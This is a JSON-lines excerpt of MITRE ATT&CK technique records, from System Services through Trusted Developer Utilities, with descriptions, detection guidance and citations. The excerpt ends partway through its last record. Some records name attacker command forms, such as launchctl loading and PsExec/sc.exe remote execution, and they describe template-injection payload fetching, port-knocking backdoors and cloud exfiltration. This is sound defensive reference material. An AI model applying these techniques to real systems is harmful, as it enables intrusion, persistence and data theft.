{"ID":"T1569","name":"System Services","description":"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.","url":"https://attack.mitre.org/techniques/T1569","created":"10 March 2020","last modified":"22 March 2022","version":"1.2","tactics":"Execution","detection":"Monitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator, root, SYSTEM, User","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cisco Talos Intelligence Group),(Citation: win10_asr)"}
{"ID":"T1569.001","name":"System Services: Launchctl","description":"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)\n\nAdversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w \"%s/Library/LaunchAgents/%s\"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)\n","url":"https://attack.mitre.org/techniques/T1569/001","created":"10 March 2020","last modified":"15 October 2021","version":"1.1","tactics":"Execution","detection":"Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Monitor for recently modified or created plist files with a significant change to the executable path executed with the command-line <code>launchctl</code> command. Plist files are located in the root, system, and users <code>/Library/LaunchAgents</code> or <code>/Library/LaunchDaemons</code> folders. \n\nMonitor command-line execution of the <code>launchctl</code> command immediately followed by abnormal network connections. [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s with executable paths pointing to <code>/tmp</code> and <code>/Shared</code> folders locations are potentially suspicious. \n\nWhen removing [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s ensure the services are unloaded prior to deleting plist files.","platforms":"macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation","is sub-technique":true,"sub-technique of":"T1569","defenses bypassed":null,"contributors":null,"permissions required":"root, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Securelist Calisto July 2018),(Citation: ESET LoudMiner June 2019),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: trendmicro xcsset xcode project 2020),(Citation: CISA AppleJeus Feb 2021),"}
{"ID":"T1569.002","name":"System Services: Service Execution","description":"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.","url":"https://attack.mitre.org/techniques/T1569/002","created":"10 March 2020","last modified":"30 August 2021","version":"1.1","tactics":"Execution","detection":"Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1569","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, SYSTEM","supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Palo Alto Networks BBSRAT),(Citation: Novetta Winnti April 2015),(Citation: NCC Group Chimera January 2021),(Citation: Palo Alto Shamoon Nov 2016),(Citation: NCC Group APT15 Alive and Strong),(Citation: Microsoft Wingbird Nov 2017),(Citation: Symantec Buckeye),(Citation: Group IB Silence Sept 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: ESET LoudMiner June 2019),(Citation: Talos Nyetya June 2017),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2020),(Citation: NCC Group WastedLocker June 2020),(Citation: McAfee Honeybee),(Citation: DFIR Ryuk in 5 Hours October 2020),(Citation: Impacket Tools),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Unit 42 WhisperGate January 2022),(Citation: Cyberreason Anchor December 2019),(Citation: Unit42 Emissary Panda May 2019),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: ESET Okrum July 2019),(Citation: xCmd),(Citation: CERT-FR PYSA April 2020),(Citation: FireEye APT41 March 2020),(Citation: McAfee Shamoon December19 2018),(Citation: Gh0stRAT ATT March 2019),(Citation: FireEye FIN6 Apr 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: US-CERT NotPetya 2017),(Citation: Github PowerShell Empire),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: GitHub PoshC2),(Citation: Talos ZxShell Oct 2014),(Citation: Symantec Chafer February 2018),(Citation: Github Koadic),(Citation: ESET Attor Oct 2019),(Citation: SecureList Silence Nov 2017),(Citation: Sophos Netwalker May 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Savill 1999),(Citation: BitDefender Chafer May 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Talos Promethium June 2020),(Citation: DFIR Ryuk's Return October 2020),(Citation: Secpod Winexe June 2017),(Citation: Group IB APT 41 June 2021),(Citation: ESET OceanLotus Mar 2019),(Citation: Medium Anchor DNS July 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: Symantec Hydraq Persistence Jan 2010),(Citation: Sophos Ragnar May 2020),(Citation: cobaltstrike manual),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Talos Olympic Destroyer 2018),(Citation: Cylance Cleaver),(Citation: Russinovich Sysinternals),(Citation: Bitdefender StrongPity June 2020),(Citation: Talos TinyTurla September 2021),(Citation: Microsoft SIR Vol 21),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Hermetic Wizard March 2022),(Citation: Trend Micro Iron Tiger April 2021),(Citation: GitHub Pupy),(Citation: McAfee GhostSecret),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: win10_asr)"}
{"ID":"T1529","name":"System Shutdown/Reboot","description":"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)","url":"https://attack.mitre.org/techniques/T1529","created":"04 October 2019","last modified":"22 March 2023","version":"1.3","tactics":"Impact","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006. Unexpected or unauthorized commands from network cli on network devices may also be associated with shutdown/reboot, e.g. the <code>reload</code> command.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: Process Creation, Sensor Health: Host Status","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; Hubert Mank","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: Sophos Maze VM September 2020),(Citation: US-CERT SHARPKNOT June 2018),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Unit 42 Shamoon3 2018),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: FireEye APT38 Oct 2018),(Citation: Talos Olympic Destroyer 2018),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: Wired Lockergoga 2019),(Citation: Talos Group123),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: McAfee Shamoon December 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Talos Nyetya June 2017),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Trend Micro KillDisk 2),"}
{"ID":"T1124","name":"System Time Discovery","description":"An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time)(Citation: Technet Windows Time Service)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)","url":"https://attack.mitre.org/techniques/T1124","created":"31 May 2017","last modified":"12 April 2023","version":"1.3","tactics":"Discovery","detection":"Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.\n\nFor network infrastructure devices, collect AAA logging to monitor `show` commands being run by non-standard users from non-standard locations.","platforms":"Network, Windows","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense; FIRST.ORG's Cyber Threat Intelligence SIG","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Proofpoint Azorult July 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: Trend Micro Conficker),(Citation: FoxIT Wocao December 2019),(Citation: McAfee Lazarus Nov 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ATT Sidewinder January 2021),(Citation: ESET InvisiMole June 2018),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: ESET Okrum July 2019),(Citation: ESET Zebrocy Nov 2018),(Citation: TechNet Net Time),(Citation: Unit42 Cannon Nov 2018),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: objective-see windtail1 dec 2018),(Citation: GovCERT Carbon May 2016),(Citation: NCC Group Team9 June 2020),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: ESET PipeMon May 2020),(Citation: JoeSecurity Egregor 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Unit 42 Shamoon3 2018),(Citation: Palo Alto MoonWind March 2017),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Unit42 BendyBear Feb 2021),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: Trend Micro Tick November 2019),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Cylance Shaheen Nov 2018),(Citation: Kaspersky TajMahal April 2019),(Citation: Unit 42 OilRig Sept 2018),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Volexity PowerDuke November 2016),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: ESET GreyEnergy Oct 2018),(Citation: Palo Alto T9000 Feb 2016),(Citation: SecureList Griffon May 2019),(Citation: Cofense Astaroth Sept 2018),(Citation: Kaspersky StoneDrill 2017),(Citation: Kaspersky CactusPete Aug 2020),(Citation: CISA Zebrocy Oct 2020),(Citation: GDATA Zeus Panda June 2017),(Citation: Kaspersky Turla),(Citation: CISA ComRAT Oct 2020),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: NCC Group Chimera January 2021),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Medium Metamorfo Apr 2020),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Talos GravityRAT),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Cybereason Bazar July 2020),(Citation: Lastline DarkHotel Just In Time Decryption Nov 2015),(Citation: HP SVCReady Jun 2022),(Citation: BlackBerry CostaRicto November 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Mandiant APT41),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Zscaler Higaisa 2020),(Citation: ESET RTM Feb 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye APT10 Sept 2018),(Citation: Unit42 Azorult Nov 2018),(Citation: DigiTrust Agent Tesla Jan 2017),(Citation: SANS Conficker),(Citation: McAfee GhostSecret),"}
{"ID":"T1080","name":"Taint Shared Content","description":"\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.","url":"https://attack.mitre.org/techniques/T1080","created":"31 May 2017","last modified":"30 March 2023","version":"1.3","tactics":"Lateral Movement","detection":"Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\n\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.","platforms":"Linux, Office 365, SaaS, Windows, macOS","data sources":"File: File Creation, File: File Modification, Network Share: Network Share Access, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"David Routin; Michal Dida, ESET","permissions required":"User","supports remote":null,"system requirements":"Access to shared folders and content with write permissions","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: TrendMicro Ursnif Mar 2015),(Citation: CarbonBlack Conti July 2020),(Citation: TrendMicro Ursnif File Dec 2014),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: ESET Gamaredon June 2020),(Citation: Cisco H1N1 Part 2),(Citation: Cybereason Conti Jan 2021),(Citation: Softpedia MinerC),(Citation: Eset Ramsay May 2020),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky Darkhotel),(Citation: Windows Commands JPCERT),(Citation: Beechey 2010),(Citation: NSA MS AppLocker),(Citation: TechNet Applocker vs SRP),(Citation: Corio 2008)"}
{"ID":"T1221","name":"Template Injection","description":"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)","url":"https://attack.mitre.org/techniques/T1221","created":"17 October 2018","last modified":"12 January 2022","version":"1.3","tactics":"Defense Evasion","detection":"Analyze process behavior to determine if user document applications (such as Office) are performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https://attack.mitre.org/techniques/T1059/001)), or other suspicious actions that could relate to post-compromise behavior.\n\nMonitor .rtf files for strings indicating the <code>&#42;\\template</code> control word has been modified to retrieve a URL resource, such as <code>&#42;\\template http</code> or <code>&#42;\\template \\u-</code>.","platforms":"Windows","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Static File Analysis","contributors":"Brian Wiltse @evalstrings; Michael Raggi @aRtAGGI; Patrick Campbell, @pjcampbe11","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: TrendMicro Gamaredon April 2020),(Citation: McAfee Lazarus Jul 2020),(Citation: Secureworks IRON TILDEN Profile),(Citation: Cybereason Chaes Nov 2020),(Citation: Proofpoint RTF Injection),(Citation: US-CERT TA18-074A),(Citation: Talos Frankenstein June 2019),(Citation: Unit 42 Inception November 2018),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: CERT-EE Gamaredon January 2021),(Citation: ESET Gamaredon June 2020),(Citation: Unit42 Sofacy Dec 2018),(Citation: Uptycs Confucius APT Jan 2021),(Citation: Unit 42 Phishery Aug 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Unit 42 Gamaredon February 2022),(Citation: Microsoft Actinium February 2022),(Citation: Anomali Template Injection MAR 2018),(Citation: Microsoft Disable Macros)"}
{"ID":"T1205","name":"Traffic Signaling","description":"Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)","url":"https://attack.mitre.org/techniques/T1205","created":"18 April 2018","last modified":"19 October 2022","version":"2.4","tactics":"Command and Control, Defense Evasion, Persistence","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\nThe Wake-on-LAN magic packet consists of 6 bytes of <code>FF</code> followed by sixteen repetitions of the target system's IEEE address. Seeing this string anywhere in a packet's payload may be indicative of a Wake-on-LAN attempt.(Citation: GitLab WakeOnLAN)","platforms":"Linux, Network, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Defensive network service scanning","contributors":"Josh Day, Gigamon; Tony Lee","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bleeping Computer - Ryuk WoL),(Citation: ESET Kobalos Feb 2021),(Citation: Chaos Stolen Backdoor),(Citation: Umbreon Trend Micro),(Citation: ESET Kobalos Jan 2021),(Citation: Leonardo Turla Penquin May 2020),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Mandiant - Synful Knock),(Citation: Kaspersky Turla Penquin December 2014),(Citation: Chronicle Winnti for Linux May 2019),"}
{"ID":"T1205.001","name":"Traffic Signaling: Port Knocking","description":"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.","url":"https://attack.mitre.org/techniques/T1205/001","created":"01 July 2020","last modified":"11 March 2022","version":"1.1","tactics":"Command and Control, Defense Evasion, Persistence","detection":"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.","platforms":"Linux, Network, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1205","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: Bitdefender StrongPity June 2020),"}
{"ID":"T1205.002","name":"Traffic Signaling: Socket Filters","description":"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.","url":"https://attack.mitre.org/techniques/T1205/002","created":"30 September 2022","last modified":"20 October 2022","version":"1.0","tactics":"Command and Control, Defense Evasion, Persistence","detection":"Identify running processes with raw sockets. Ensure processes listed have a need for an open raw socket and are in accordance with enterprise policy.(Citation: crowdstrike bpf socket filters)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1205","defenses bypassed":null,"contributors":"CrowdStrike; Tim (Wadhwa-)Brown","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Leonardo Turla Penquin May 2020),"}
{"ID":"T1537","name":"Transfer Data to Cloud Account","description":"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018) ","url":"https://attack.mitre.org/techniques/T1537","created":"30 August 2019","last modified":"16 June 2022","version":"1.3","tactics":"Exfiltration","detection":"Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. \n\nIn AWS, sharing an Elastic Block Store (EBS) snapshot, either with specified users or publicly, generates a ModifySnapshotAttribute event in CloudTrail logs.(Citation: AWS EBS Snapshot Sharing) Similarly, in Azure, creating a Shared Access Signature (SAS) URI for a Virtual Hard Disk (VHS) snapshot generates a \"Get Snapshot SAS URL\" event in Activity Logs.(Citation: Azure Blob Snapshots)(Citation: Azure Shared Access Signature)","platforms":"IaaS","data sources":"Cloud Storage: Cloud Storage Creation, Cloud Storage: Cloud Storage Metadata, Cloud Storage: Cloud Storage Modification, Network Traffic: Network Traffic Content, Snapshot: Snapshot Creation, Snapshot: Snapshot Metadata, Snapshot: Snapshot Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Darin Smith, Cisco; ExtraHop; Praetorian","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1127","name":"Trusted Developer Utilities Proxy Execution","description":"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.","url":"https://attack.mitre.org/techniques/T1127","created":"31 May 2017","last modified":"05 May 2022","version":"1.2","tactics":"Defense Evasion","detection":"Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and 